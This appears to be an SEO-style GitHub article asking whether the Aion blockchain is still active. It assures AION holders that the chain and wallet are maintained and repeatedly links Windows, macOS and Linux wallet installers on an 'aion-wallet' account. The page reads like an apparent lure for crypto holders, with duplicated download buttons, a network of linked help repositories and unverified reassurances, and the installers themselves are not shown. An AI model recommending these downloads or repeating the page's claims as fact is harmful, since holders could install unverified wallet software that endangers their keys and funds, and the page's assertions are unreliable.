![Aion Wallet](assets/banner-article.png)

# Is Aion still active

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion is still active: the node repository publishes releases, the chain has a live mainnet with chain ID 256, and the desktop wallet is maintained, so the useful question is not whether the network exists but which parts of it are being worked on.

"Active" covers several different things, and the answer changes depending on which one is meant. A chain can produce blocks while its developer community is small; a project can ship software while its token trades thinly. Separating those avoids both wishful and dismissive answers.

## You'll see this if

- You found an old article describing the project in the past tense.
- You hold AION and want to know whether the wallet still works.
- You are deciding whether to learn the stack.
- You are comparing the project's activity with a newer chain's.

## What can be checked directly

Releases. The node repository has a release history that continues into recent years, with versioned archives and notes. A repository that publishes a consensus-relevant release is a repository someone maintains.

The wallet. The desktop client on this account is the current build, published with installers and checksums for three platforms.

The chain. Chain ID 256 identifies mainnet, and block production is observable through a node or an explorer. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide lists the identifiers a connection needs.

The virtual machine. The AVM's releases are older than the node's, which is normal for a component whose specification changes rarely.

## What "active" does not mean

It does not mean the ecosystem is large. The set of wallets, pools and tools around Aion is smaller than around the chains that dominate the market, and a smaller ecosystem means fewer answers when something breaks.

It does not mean prices are stable or volumes are high. Market conditions are outside the scope of a technical answer, and no article here forecasts them.

It does not mean every historical feature still works. The ERC-20 swap closed in 2022, and a browser-extension wallet from the same era has been withdrawn. Activity at the protocol level and continuity of every service are different claims.

## Checks a holder can run in ten minutes

Open the release page and confirm the current version and its date. Install or update the wallet and confirm it reaches a node. Look up your address on an explorer and confirm the balance matches the wallet.

If all three work, the network is serving you, which is the practical meaning of active for anyone holding the token.

## What to do if a check fails

A failing explorer is usually an availability problem rather than a network one, and the [Aion explorer down](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-explorer-down.md) guide covers what still works.

A wallet that will not connect is a local or endpoint fault, covered by the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) article.

A balance that does not appear after a restore is an account question, covered by the zero-balance guide.

## The honest summary

The chain runs, the software ships, and the tooling is maintained by a small team rather than a large one. That is a different statement from "the project is thriving", and it is the one the evidence supports.

For a holder, that means keeping the wallet updated, keeping the recovery phrase backed up, and not assuming that a service which existed in 2018 still exists now.

## Prevention

Check the release page rather than a news article when you want to know whether software is maintained.

Keep the current installer and its hash, so a rebuild does not depend on a search result.

Treat claims in either direction as things to verify. "Dead" and "booming" are both assertions that a release page and a block explorer can settle in minutes.

## What a developer can check

A developer should look at three things rather than at a headline. The node release history, which shows whether consensus-relevant software is being published. The virtual machine's state, which changes rarely but is documented. And the tooling around both, which is the part that most often goes quiet first.

If you are evaluating it for a project, clone the node repository, read the last release note and try a local deployment. That exercise answers more than any commentary, and it tells you whether the software builds on a current toolchain rather than only on the one it was written for.

The [how to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) guide is the shortest path from evaluation to a running local chain, and the AVM article covers what a contract deployment involves.

## Frequently asked questions

### Does the chain still produce blocks?

Yes. Mainnet operates under Unity consensus, and block production is checkable through a node or an explorer.

### Is the desktop wallet still updated?

The current build is published on this account with installers for Windows, macOS and Linux and a checksum for each.

### Is the project abandoned?

No. Releases continue and the wallet is maintained. The ecosystem is small, which is a different statement.

### Should I worry about holding AION?

That is a personal decision about risk, not a technical fact. What can be said is that the software works and the keys are yours if you hold them yourself.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [What is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) - the network described from scratch.
- [What happened to Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-happened-to-aion.md) - the history that produces the past-tense articles.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - confirming mainnet.
- [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) - when a local check fails.
